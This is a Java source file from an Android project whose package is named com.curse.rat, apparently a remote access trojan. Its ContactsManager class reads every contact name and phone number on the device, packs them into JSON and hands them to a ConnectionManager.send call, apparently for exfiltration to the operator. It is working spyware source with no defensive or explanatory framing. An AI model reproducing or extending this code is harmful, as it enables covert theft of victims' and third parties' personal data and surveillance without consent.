package com.curse.rat;

import android.content.Context;
import android.database.Cursor;
import android.provider.ContactsContract;
import org.json.JSONArray;
import org.json.JSONObject;

public class ContactsManager {
    public static void getContacts(Context context) {
        try {
            JSONArray list = new JSONArray();
            Cursor cursor = context.getContentResolver().query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                new String[] { 
                    ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME, 
                    ContactsContract.CommonDataKinds.Phone.NUMBER 
                }, 
                null, null, 
                ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC"
            );

            if (cursor != null) {
                while (cursor.moveToNext()) {
                    JSONObject contact = new JSONObject();
                    contact.put("name", cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)));
                    contact.put("number", cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER)));
                    list.put(contact);
                }
                cursor.close();
            }

            JSONObject res = new JSONObject();
            res.put("type", "contacts");
            res.put("data", list);
            ConnectionManager.send(res.toString());
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
